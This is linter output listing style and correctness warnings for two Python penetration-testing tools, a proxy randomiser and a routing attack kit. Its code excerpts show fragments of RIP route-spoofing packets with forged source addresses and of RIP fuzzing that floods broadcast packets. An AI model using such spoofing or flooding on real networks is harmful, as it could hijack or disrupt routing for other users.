help: Convert to f-string

F841 Local variable `args` is assigned to but never used
   --> security\penetration-testing-tools\networks\RandMyProxy.py:296:5
    |
295 | def main(argv):
296 |     args = getopts(argv)
    |     ^^^^
297 |
298 |     proxies = []
    |
help: Remove assignment to unused variable `args`

N806 Variable `checkedHosts` in function should be lowercase
   --> security\penetration-testing-tools\networks\RandMyProxy.py:301:5
    |
299 |     hosts = set()
300 |     maxerr = 3
301 |     checkedHosts = {}
    |     ^^^^^^^^^^^^
302 |
303 |     j = 1
    |

B007 Loop control variable `i` not used within loop body
   --> security\penetration-testing-tools\networks\RandMyProxy.py:305:9
    |
303 |     j = 1
304 |     err = 0
305 |     for i in range(config["proxies_num"]):
    |         ^
306 |         verbose(f"Looking up proxy #{j}...")
    |
help: Rename unused `i` to `_i`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\networks\RandMyProxy.py:314:16
    |
312 |                 err += 1
313 |
314 |             if host in checkedHosts.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^
315 |                 verbose("That proxy was already checked. Skipping it.")
316 |                 checkedHosts[host] += 1
    |
help: Remove `.keys()`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\networks\RandMyProxy.py:326:16
    |
324 |                     break
325 |
326 |             if host in checkedHosts.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^
327 |                 if checkedHosts[host] > maxerr:
328 |                     break
    |
help: Remove `.keys()`

F401 [*] `random` imported but unused
  --> security\penetration-testing-tools\networks\RoutingAttackKit.py:22:8
   |
20 | import fcntl
21 | import multiprocessing
22 | import random
   |        ^^^^^^
23 | import socket
24 | import string
   |
help: Remove unused import: `random`

F403 `from scapy.all import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\networks\RoutingAttackKit.py:31:5
   |
30 | try:
31 |     from scapy.all import *
   |     ^^^^^^^^^^^^^^^^^^^^^^^
32 | except ImportError:
33 |     print("[!] Scapy required: pip install scapy")
   |

N816 Variable `stopThreads` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\RoutingAttackKit.py:54:1
   |
53 | attacks = {}
54 | stopThreads = False
   | ^^^^^^^^^^^
   |

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\networks\RoutingAttackKit.py:63:16
   |
62 | def flooder(num, packets):
63 |     Logger.dbg("Starting task: {}, packets num: {}".format(num, len(packets)))
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
64 |
65 |     for p in packets:
   |
help: Convert to f-string

F405 `sendp` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\networks\RoutingAttackKit.py:72:13
   |
70 |                 raise KeyboardInterrupt
71 |
72 |             sendp(p, verbose=False)
   |             ^^^^^
73 |
74 |             if len(p) < 1500:
   |

F841 [*] Local variable `e` is assigned to but never used
  --> security\penetration-testing-tools\networks\RoutingAttackKit.py:79:29
   |
77 |         except KeyboardInterrupt:
78 |             break
79 |         except Exception as e:
   |                             ^
80 |             pass
   |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\networks\RoutingAttackKit.py:82:16
   |
80 |             pass
81 |
82 |     Logger.dbg("Stopping task: {}".format(num))
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |
help: Convert to f-string

N803 Argument name `maxLen` should be lowercase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:175:25
    |
174 |     @staticmethod
175 |     def getFuzzyStrings(maxLen=-1, allOfThem=True):
    |                         ^^^^^^^^^
176 |         out = set()
177 |         for b in Fuzzer.get16bitFuzzes():
    |

N803 Argument name `allOfThem` should be lowercase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:175:36
    |
174 |     @staticmethod
175 |     def getFuzzyStrings(maxLen=-1, allOfThem=True):
    |                                    ^^^^^^^^^^^^^^
176 |         out = set()
177 |         for b in Fuzzer.get16bitFuzzes():
    |

C403 Unnecessary list comprehension (rewrite as a set comprehension)
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:187:20
    |
186 |         if maxLen != -1:
187 |             return set([x for x in out if len(x) <= maxLen])
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
188 |
189 |         return out
    |
help: Rewrite as a set comprehension

N805 First argument of a method should be named `self`
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:215:23
    |
213 |         self.config.update(params)
214 |
215 |     def processPacket(pkt):
    |                       ^^^
216 |         # TODO
217 |         raise Exception("Not yet implemented.")
    |
help: Rename `pkt` to `self`

F841 Local variable `pkts` is assigned to but never used
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:227:13
    |
226 |         try:
227 |             pkts = sniff(
    |             ^^^^
228 |                 count=1000,
229 |                 filter="udp port 520",
    |
help: Remove assignment to unused variable `pkts`

F405 `sniff` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:227:20
    |
226 |         try:
227 |             pkts = sniff(
    |                    ^^^^^
228 |                 count=1000,
229 |                 filter="udp port 520",
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:238:28
    |
236 |                 pass
237 |             else:
238 |                 Logger.err("Exception occured during sniffing: {}".format(str(e)))
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
239 |         except KeyboardInterrupt:
240 |             pass
    |
help: Convert to f-string

N815 Variable `ripAuthTypes` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:244:5
    |
243 | class RIPv1v2Attacks(RoutingAttack):
244 |     ripAuthTypes = {"simple": 2, "md5": 3, "md5authdata": 1}
    |     ^^^^^^^^^^^^
245 |
246 |     def __init__(self):
    |

F405 `RIPAuth` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:260:19
    |
258 |     @staticmethod
259 |     def getRipAuth(config):
260 |         ripauth = RIPAuth()
    |                   ^^^^^^^
261 |
262 |         ripauth.authtype = RIPv1v2Attacks.ripAuthTypes[config["auth-type"]]
    |

F405 `sendp` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:311:9
    |
309 |             )
310 |         )
311 |         sendp(packet, loop=1, inter=self.config["delay"], iface=config["interface"])
    |         ^^^^^
312 |
313 |     def getPacket(self):
    |

N806 Variable `networkToAnnounce` in function should be lowercase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:314:9
    |
313 |     def getPacket(self):
314 |         networkToAnnounce = self.config["network"]
    |         ^^^^^^^^^^^^^^^^^
315 |         metricToAnnounce = self.config["metric"]
316 |         netmaskToAnnounce = self.config["netmask"]
    |

N806 Variable `metricToAnnounce` in function should be lowercase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:315:9
    |
313 |     def getPacket(self):
314 |         networkToAnnounce = self.config["network"]
315 |         metricToAnnounce = self.config["metric"]
    |         ^^^^^^^^^^^^^^^^
316 |         netmaskToAnnounce = self.config["netmask"]
317 |         nexthopToAnnounce = self.config["nexthop"]
    |

N806 Variable `netmaskToAnnounce` in function should be lowercase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:316:9
    |
314 |         networkToAnnounce = self.config["network"]
315 |         metricToAnnounce = self.config["metric"]
316 |         netmaskToAnnounce = self.config["netmask"]
    |         ^^^^^^^^^^^^^^^^^
317 |         nexthopToAnnounce = self.config["nexthop"]
318 |         spoofedIp = self.config["spoof"]
    |

N806 Variable `nexthopToAnnounce` in function should be lowercase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:317:9
    |
315 |         metricToAnnounce = self.config["metric"]
316 |         netmaskToAnnounce = self.config["netmask"]
317 |         nexthopToAnnounce = self.config["nexthop"]
    |         ^^^^^^^^^^^^^^^^^
318 |         spoofedIp = self.config["spoof"]
    |

N806 Variable `spoofedIp` in function should be lowercase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:318:9
    |
316 |         netmaskToAnnounce = self.config["netmask"]
317 |         nexthopToAnnounce = self.config["nexthop"]
318 |         spoofedIp = self.config["spoof"]
    |         ^^^^^^^^^
319 |
320 |         etherframe = Ether()  # Start definition of Ethernet Frame
    |

F405 `Ether` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:320:22
    |
318 |         spoofedIp = self.config["spoof"]
319 |
320 |         etherframe = Ether()  # Start definition of Ethernet Frame
    |                      ^^^^^
321 |
322 |         ip = IP()  # IPv4 packet
    |

F405 `IP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:322:14
    |
320 |         etherframe = Ether()  # Start definition of Ethernet Frame
321 |
322 |         ip = IP()  # IPv4 packet
    |              ^^
323 |
324 |         udp = UDP()
    |

F405 `UDP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:324:15
    |
322 |         ip = IP()  # IPv4 packet
323 |
324 |         udp = UDP()
    |               ^^^
325 |         udp.sport = 520  # According to RFC1058, 520/UDP port must be used for solicited communication
326 |         udp.dport = 520
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:328:15
    |
326 |         udp.dport = 520
327 |
328 |         rip = RIP()
    |               ^^^
329 |
330 |         ripentry = RIPEntry()  # Announced route
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:330:20
    |
328 |         rip = RIP()
329 |
330 |         ripentry = RIPEntry()  # Announced route
    |                    ^^^^^^^^
331 |         ripentry.AF = "IP"  # Address Family: IP
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:333:12
    |
331 |         ripentry.AF = "IP"  # Address Family: IP
332 |
333 |         if "AF" in self.config.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^
334 |             ripentry.AF = self.config["AF"]
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:357:12
    |
355 |             )
356 |
357 |         if "rip_cmd" in self.config.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
358 |             rip.cmd = self.config["rip_cmd"]
    |
help: Remove `.keys()`

F405 `IP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:371:20
    |
369 |             rip_packet = etherframe / ip / udp / rip / ripauth / ripentry
370 |
371 |         rip_packet[IP].src = spoofedIp
    |                    ^^
372 |         return rip_packet
    |

N815 Variable `ripCommands` in class scope should not be mixedCase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:376:5
    |
375 | class RIPFuzzer(RoutingAttack):
376 |     ripCommands = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11)
    |     ^^^^^^^^^^^
377 |
378 |     def __init__(self):
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:403:13
    |
402 |           Logger.info(
403 | /             "Collected in total {} packets to send. Sending them out...".format(
404 | |                 len(packets)
405 | |             )
    | |_____________^
406 |           )
    |
help: Convert to f-string

N806 Variable `packetsLists` in function should be lowercase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:408:9
    |
406 |         )
407 |
408 |         packetsLists = [[] for x in range(self.config["processors"])]
    |         ^^^^^^^^^^^^
409 |         packetsList = list(packets)
410 |         for i in range(len(packetsList)):
    |

N806 Variable `packetsList` in function should be lowercase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:409:9
    |
408 |         packetsLists = [[] for x in range(self.config["processors"])]
409 |         packetsList = list(packets)
    |         ^^^^^^^^^^^
410 |         for i in range(len(packetsList)):
411 |             packetsLists[i % config["processors"]].append(packetsList[i])
    |

N806 Variable `stopThreads` in function should be lowercase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:426:13
    |
424 |                 jobs = [job for job in jobs if job.is_alive()]
425 |         except KeyboardInterrupt:
426 |             stopThreads = True
    |             ^^^^^^^^^^^
427 |             print("\n[>] Stopping...")
    |

N806 Variable `stopThreads` in function should be lowercase
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:429:9
    |
427 |             print("\n[>] Stopping...")
428 |
429 |         stopThreads = True
    |         ^^^^^^^^^^^
430 |         time.sleep(3)
    |

F841 Local variable `stopThreads` is assigned to but never used
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:429:9
    |
427 |             print("\n[>] Stopping...")
428 |
429 |         stopThreads = True
    |         ^^^^^^^^^^^
430 |         time.sleep(3)
    |
help: Remove assignment to unused variable `stopThreads`

F405 `time` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:430:9
    |
429 |         stopThreads = True
430 |         time.sleep(3)
    |         ^^^^
431 |
432 |         Logger.ok("Fuzzing finished. Sent around {} packets.".format(len(packets)))
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:432:19
    |
430 |         time.sleep(3)
431 |
432 |         Logger.ok("Fuzzing finished. Sent around {} packets.".format(len(packets)))
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
433 |
434 |     def generateRipv1Packets(self):
    |
help: Convert to f-string

F405 `Ether` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:437:13
    |
435 |         packets = set()
436 |         base = (
437 |             Ether(dst="ff:ff:ff:ff:ff:ff")
    |             ^^^^^
438 |             / IP(dst="255.255.255.255")
439 |             / UDP(sport=520, dport=520)
    |

F405 `IP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:438:15
    |
436 |         base = (
437 |             Ether(dst="ff:ff:ff:ff:ff:ff")
438 |             / IP(dst="255.255.255.255")
    |               ^^
439 |             / UDP(sport=520, dport=520)
440 |         )
    |

F405 `UDP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:439:15
    |
437 |             Ether(dst="ff:ff:ff:ff:ff:ff")
438 |             / IP(dst="255.255.255.255")
439 |             / UDP(sport=520, dport=520)
    |               ^^^
440 |         )
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:444:19
    |
442 |         # Step 1: Fuzz on Command values.
443 |         for val in set(RIPFuzzer.ripCommands + tuple(Fuzzer.get8bitFuzzes())):
444 |             rip = RIP(version=1, cmd=val)
    |                   ^^^
445 |             packets.add(base / rip)
446 |             packets.add(base / rip / RIPEntry())
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:446:38
    |
444 |             rip = RIP(version=1, cmd=val)
445 |             packets.add(base / rip)
446 |             packets.add(base / rip / RIPEntry())
    |                                      ^^^^^^^^
447 |
448 |         # Step 1b: Fuzz on Command values with packet filled up with data
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:450:19
    |
448 |         # Step 1b: Fuzz on Command values with packet filled up with data
449 |         for val in set(RIPFuzzer.ripCommands + tuple(Fuzzer.get8bitFuzzes())):
450 |             rip = RIP(version=1, cmd=val)
    |                   ^^^
451 |
452 |             for data in Fuzzer.getFuzzyStrings():
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:456:42
    |
454 |                     data = ""
455 |                 packets.add(base / rip / data)
456 |                 packets.add(base / rip / RIPEntry() / data)
    |                                          ^^^^^^^^
457 |
458 |         # Step 2: Fuzz on Response RIPEntry AF values.
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:460:19
    |
458 |         # Step 2: Fuzz on Response RIPEntry AF values.
459 |         for val in set(Fuzzer.get8bitFuzzes()):
460 |             rip = RIP(version=1, cmd=2)
    |                   ^^^
461 |             packets.add(base / rip / RIPEntry(AF=val))
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:461:38
    |
459 |         for val in set(Fuzzer.get8bitFuzzes()):
460 |             rip = RIP(version=1, cmd=2)
461 |             packets.add(base / rip / RIPEntry(AF=val))
    |                                      ^^^^^^^^
462 |
463 |         # Step 3: Fuzz on Response RIPEntry RouteTag values.
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:465:19
    |
463 |         # Step 3: Fuzz on Response RIPEntry RouteTag values.
464 |         for val in set(Fuzzer.get8bitFuzzes()):
465 |             rip = RIP(version=1, cmd=2)
    |                   ^^^
466 |             packets.add(base / rip / RIPEntry(RouteTag=val))
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:466:38
    |
464 |         for val in set(Fuzzer.get8bitFuzzes()):
465 |             rip = RIP(version=1, cmd=2)
466 |             packets.add(base / rip / RIPEntry(RouteTag=val))
    |                                      ^^^^^^^^
467 |
468 |         # Step 4: Fuzz on Response RIPEntry metric values.
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:470:19
    |
468 |         # Step 4: Fuzz on Response RIPEntry metric values.
469 |         for val in set(Fuzzer.get8bitFuzzes()):
470 |             rip = RIP(version=1, cmd=2)
    |                   ^^^
471 |             packets.add(base / rip / RIPEntry(metric=val))
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:471:38
    |
469 |         for val in set(Fuzzer.get8bitFuzzes()):
470 |             rip = RIP(version=1, cmd=2)
471 |             packets.add(base / rip / RIPEntry(metric=val))
    |                                      ^^^^^^^^
472 |
473 |         # Step 5: Add multiple RIPEntry structures
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:475:19
    |
473 |         # Step 5: Add multiple RIPEntry structures
474 |         for num in Fuzzer.get32bitProblematicPowersOf2():
475 |             rip = RIP(version=1, cmd=2)
    |                   ^^^
476 |             entries = []
477 |             try:
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:479:13
    |
477 |             try:
478 |                 ipv4 = socket.inet_ntoa(struct.pack("!L", num))
479 |             except:
    |             ^^^^^^
480 |                 ipv4 = "127.0.0.2"
    |

B007 Loop control variable `i` not used within loop body
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:485:17
    |
483 |                 break
484 |
485 |             for i in range(num):
    |                 ^
486 |                 entries.append(RIPEntry(addr=ipv4))
    |
help: Rename unused `i` to `_i`

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:486:32
    |
485 |             for i in range(num):
486 |                 entries.append(RIPEntry(addr=ipv4))
    |                                ^^^^^^^^
487 |
488 |             packets.add(base / rip / "".join([str(x) for x in entries]))
    |

F405 `Ether` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:495:13
    |
493 |         packets = set()
494 |         base = (
495 |             Ether()
    |             ^^^^^
496 |             / IP(src=self.config["spoof"], dst="224.0.0.9")
497 |             / UDP(sport=520, dport=520)
    |

F405 `IP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:496:15
    |
494 |         base = (
495 |             Ether()
496 |             / IP(src=self.config["spoof"], dst="224.0.0.9")
    |               ^^
497 |             / UDP(sport=520, dport=520)
498 |         )
    |

F405 `UDP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:497:15
    |
495 |             Ether()
496 |             / IP(src=self.config["spoof"], dst="224.0.0.9")
497 |             / UDP(sport=520, dport=520)
    |               ^^^
498 |         )
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:502:19
    |
500 |         # Step 1: Fuzz on Command values.
501 |         for val in set(RIPFuzzer.ripCommands + tuple(Fuzzer.get8bitFuzzes())):
502 |             rip = RIP(version=2, cmd=val)
    |                   ^^^
503 |             packets.add(base / rip)
504 |             packets.add(base / rip / RIPEntry())
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:504:38
    |
502 |             rip = RIP(version=2, cmd=val)
503 |             packets.add(base / rip)
504 |             packets.add(base / rip / RIPEntry())
    |                                      ^^^^^^^^
505 |
506 |         # Step 1b: Fuzz on Command values with packet filled up with data
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:508:19
    |
506 |         # Step 1b: Fuzz on Command values with packet filled up with data
507 |         for val in set(RIPFuzzer.ripCommands + tuple(Fuzzer.get8bitFuzzes())):
508 |             rip = RIP(version=2, cmd=val)
    |                   ^^^
509 |
510 |             for data in Fuzzer.getFuzzyStrings():
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:514:42
    |
512 |                     data = ""
513 |                 packets.add(base / rip / data)
514 |                 packets.add(base / rip / RIPEntry() / data)
    |                                          ^^^^^^^^
515 |
516 |         # Step 2: Fuzz on Version values.
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:518:19
    |
516 |         # Step 2: Fuzz on Version values.
517 |         for val in set(Fuzzer.get8bitFuzzes()):
518 |             rip = RIP(version=val, cmd=1)
    |                   ^^^
519 |             packets.add(base / rip)
520 |             packets.add(base / rip / RIPEntry())
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:520:38
    |
518 |             rip = RIP(version=val, cmd=1)
519 |             packets.add(base / rip)
520 |             packets.add(base / rip / RIPEntry())
    |                                      ^^^^^^^^
521 |
522 |         # Step 3: Fuzz on Authentication data values.
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:524:19
    |
522 |         # Step 3: Fuzz on Authentication data values.
523 |         for val in set(Fuzzer.get8bitFuzzes()):
524 |             rip = RIP(version=val, cmd=1)
    |                   ^^^
525 |             for auth in RIPFuzzer.fuzzRipv2Auth():
526 |                 packets.add(base / rip / auth)
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:527:49
    |
525 |             for auth in RIPFuzzer.fuzzRipv2Auth():
526 |                 packets.add(base / rip / auth)
527 |                 packets.add(base / rip / auth / RIPEntry())
    |                                                 ^^^^^^^^
528 |
529 |         # Step 4: Fuzz on Response RIPEntry AF values.
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:531:19
    |
529 |         # Step 4: Fuzz on Response RIPEntry AF values.
530 |         for val in set(Fuzzer.get8bitFuzzes()):
531 |             rip = RIP(version=2, cmd=2)
    |                   ^^^
532 |             packets.add(base / rip / RIPEntry(AF=val))
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:532:38
    |
530 |         for val in set(Fuzzer.get8bitFuzzes()):
531 |             rip = RIP(version=2, cmd=2)
532 |             packets.add(base / rip / RIPEntry(AF=val))
    |                                      ^^^^^^^^
533 |
534 |         # Step 5: Fuzz on Response RIPEntry RouteTag values.
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:536:19
    |
534 |         # Step 5: Fuzz on Response RIPEntry RouteTag values.
535 |         for val in set(Fuzzer.get8bitFuzzes()):
536 |             rip = RIP(version=2, cmd=2)
    |                   ^^^
537 |             packets.add(base / rip / RIPEntry(RouteTag=val))
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:537:38
    |
535 |         for val in set(Fuzzer.get8bitFuzzes()):
536 |             rip = RIP(version=2, cmd=2)
537 |             packets.add(base / rip / RIPEntry(RouteTag=val))
    |                                      ^^^^^^^^
538 |
539 |         # Step 6: Fuzz on Response RIPEntry metric values.
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:541:19
    |
539 |         # Step 6: Fuzz on Response RIPEntry metric values.
540 |         for val in set(Fuzzer.get8bitFuzzes()):
541 |             rip = RIP(version=2, cmd=2)
    |                   ^^^
542 |             packets.add(base / rip / RIPEntry(metric=val))
    |

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:542:38
    |
540 |         for val in set(Fuzzer.get8bitFuzzes()):
541 |             rip = RIP(version=2, cmd=2)
542 |             packets.add(base / rip / RIPEntry(metric=val))
    |                                      ^^^^^^^^
543 |
544 |         # Step 7: Add multiple RIPEntry structures
    |

F405 `RIP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:546:19
    |
544 |         # Step 7: Add multiple RIPEntry structures
545 |         for num in Fuzzer.get32bitProblematicPowersOf2():
546 |             rip = RIP(version=2, cmd=2)
    |                   ^^^
547 |             entries = []
548 |             try:
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:550:13
    |
548 |             try:
549 |                 ipv4 = socket.inet_ntoa(struct.pack("!L", num))
550 |             except:
    |             ^^^^^^
551 |                 ipv4 = "127.0.0.2"
    |

B007 Loop control variable `i` not used within loop body
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:556:17
    |
554 |                 break
555 |
556 |             for i in range(num):
    |                 ^
557 |                 entries.append(RIPEntry(addr=ipv4))
    |
help: Rename unused `i` to `_i`

F405 `RIPEntry` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:557:32
    |
556 |             for i in range(num):
557 |                 entries.append(RIPEntry(addr=ipv4))
    |                                ^^^^^^^^
558 |
559 |             packets.add(base / rip / "".join([str(x) for x in entries]))
    |

F405 `RIPAuth` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:569:23
    |
567 |         # Step 1: Fuzz on RIPAuth authtype.
568 |         for val in set(Fuzzer.get8bitFuzzes()):
569 |             ripauth = RIPAuth()
    |                       ^^^^^^^
570 |             ripauth.authtype = val
571 |             ripauth.password = "0123456789abcdef"
    |

F405 `RIPAuth` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:576:23
    |
574 |         # Step 2: Fuzz on RIPAuth md5authdata structure's digestoffset.
575 |         for val in set(Fuzzer.get16bitFuzzes()):
576 |             ripauth = RIPAuth()
    |                       ^^^^^^^
577 |             ripauth.authtype = 1
578 |             ripauth.digestoffset = val
    |

F405 `RIPAuth` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:586:23
    |
584 |         # Step 3: Fuzz on RIPAuth md5authdata structure's keyid.
585 |         for val in set(Fuzzer.get8bitFuzzes()):
586 |             ripauth = RIPAuth()
    |                       ^^^^^^^
587 |             ripauth.authtype = 1
588 |             ripauth.digestoffset = 0
    |

F405 `RIPAuth` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:596:23
    |
594 |         # Step 4: Fuzz on RIPAuth md5authdata structure's seqnum.
595 |         for val in set(Fuzzer.get8bitFuzzes()):
596 |             ripauth = RIPAuth()
    |                       ^^^^^^^
597 |             ripauth.authtype = 1
598 |             ripauth.digestoffset = 0
    |

F405 `RIPAuth` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:606:23
    |
604 |         # Step 5: Fuzz on RIPAuth md5authdata structure's authdatalen.
605 |         for val in set(Fuzzer.getFuzzyStrings(maxLen=16, allOfThem=False)):
606 |             ripauth = RIPAuth()
    |                       ^^^^^^^
607 |             ripauth.authtype = 1
608 |             ripauth.digestoffset = 0
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:620:22
    |
618 |     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
619 |     info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack("256s", ifname[:15]))
620 |     return ":".join(["%02x" % ord(char) for char in info[18:24]])
    |                      ^^^^^^^^^^^^^^^^^^
    |
help: Replace with format specifiers

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:629:16
    |
627 |         + " | grep 'inet ' | awk '{print $2}' | head -1 | cut -d/ -f1"
628 |     )
629 |     Logger.dbg("Interface: {} has IP: {}".format(iface, out))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
630 |     return out
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:635:16
    |
633 | def shell(cmd):
634 |     out = commands.getstatusoutput(cmd)[1]
635 |     Logger.dbg('shell("{}") returned:\n"{}"'.format(cmd, out))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
636 |     return out
    |
help: Convert to f-string

B007 Loop control variable `k` not used within loop body
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:646:9
    |
644 |     }
645 |
646 |     for k, v in commands.items():
    |         ^
647 |         out = shell(v)
648 |         if len(out) > 0:
    |
